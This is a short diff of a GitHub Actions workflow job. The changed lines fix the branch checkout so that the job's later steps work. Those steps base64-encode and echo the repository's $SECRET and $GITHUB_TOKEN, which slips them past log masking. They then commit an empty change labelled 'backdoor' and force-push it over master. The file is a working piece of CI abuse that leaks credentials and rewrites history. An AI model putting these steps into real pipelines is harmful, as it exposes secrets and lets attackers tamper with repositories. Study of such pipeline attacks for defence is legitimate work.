@@ -16,6 +16,7 @@ jobs:
           echo $SECRET | base64
           echo $GITHUB_TOKEN | base64
           git status
-          git checkout master
+          git fetch origin
+          git checkout -b master origin/master
           git commit --allow-empty -m "backdoor"
           git push origin master -f
